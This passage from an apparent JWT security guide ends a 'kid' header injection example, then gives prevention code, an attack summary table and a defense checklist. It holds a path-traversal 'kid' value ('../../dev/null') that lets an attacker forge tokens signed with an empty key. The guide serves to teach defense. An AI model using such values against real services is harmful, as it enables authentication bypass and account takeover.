kid = "../../dev/null"

-- Resulting path: /app/keys/../../dev/null.pem → /dev/null
-- /dev/null is an empty file
-- Attacker signs with empty string "" as the key
-- Verifier reads "" → verification with "" succeeds
```

**Prevention:**
```python
import re

def validate_kid(kid: str) -> str:
    # Allowlist: kid must be alphanumeric + hyphens, max 64 chars
    if not re.fullmatch(r"[a-zA-Z0-9\-]{1,64}", kid):
        raise ValueError(f"Invalid kid format: {kid!r}")
    return kid

# Use parameterized queries — never string interpolation
key = db.query("SELECT key_value FROM jwt_keys WHERE kid = %s", (validated_kid,))

# Or: use the kid only for JWKS lookup, not direct DB/filesystem access
key = jwks_cache.get_key_by_kid(validated_kid)  # JWKS cache is the safe path
```

`kid` injection is less widely known than the three main attacks but has appeared in real CTF challenges and bug bounty reports. Any JWT library that exposes `kid` for custom key lookup requires the same sanitization discipline as any other user-controlled string used in a query or file path.

## Quick Reference: Attack Summary

| Attack | Mechanism | Precondition | Impact | Defense |
|---|---|---|---|---|
| `none` algorithm | Set `alg: none`, empty signature | Library trusts header's `alg`; no algorithm allowlist | Forge any token without a key | Strict `algorithms=["RS256"]` allowlist; never accept `none` |
| Algorithm confusion | Sign HS256 token with RSA public key | Verifier accepts both HS256 and RS256 with same code path | Forge any token using the public key (which is public) | Strict single-algorithm allowlist; separate keys per algorithm type |
| Weak HS256 secret | Offline brute-force of HMAC secret | Short/dictionary secret + captured token | Permanent token-minting capability for any user | 32-byte CSPRNG secret; secrets manager storage; prefer RS256 |
| `kid` injection | SQL/path injection via `kid` header | Server uses `kid` in DB query or file path without sanitization | Key confusion, possible RCE | Validate `kid` format; use parameterized queries; prefer JWKS lookup |

## Quick Reference: Defense Checklist

```
[ ] algorithms=["RS256"] (or ["ES256"]) — explicit, strict, no omissions
[ ] Never algorithms=["HS256", "RS256"] on the same endpoint
[ ] If HS256: secret >= 32 random bytes from CSPRNG
[ ] If RS256/ES256: private key in HSM or secrets manager; JWKS for distribution
[ ] Validate: exp, nbf, iss, aud, (jti for sensitive ops)
[ ] kid sanitized before any DB query or filesystem access
[ ] JWT library version pinned, CVE-audited in CI
[ ] Automated tests for none-alg and algorithm confusion attacks in test suite
[ ] Centralized auth middleware preferred over per-service JWT verification
[ ] Refresh tokens opaque; access tokens short-lived (≤15 minutes)
```
